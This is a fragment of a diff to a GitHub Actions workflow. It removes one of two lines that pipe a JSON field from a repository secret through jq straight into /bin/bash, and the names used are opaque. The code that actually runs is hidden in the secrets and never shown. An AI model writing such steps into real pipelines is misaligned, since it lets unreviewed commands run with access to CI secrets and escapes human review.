@@ -22,7 +22,6 @@ jobs:
           xmp1: ${{ secrets.xmp1 }}
         run: |
           printf '%s' "$xmp1" | jq -r .k481 | /bin/bash
-          printf '%s' "$bfm3" | jq -r .zmk4368 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
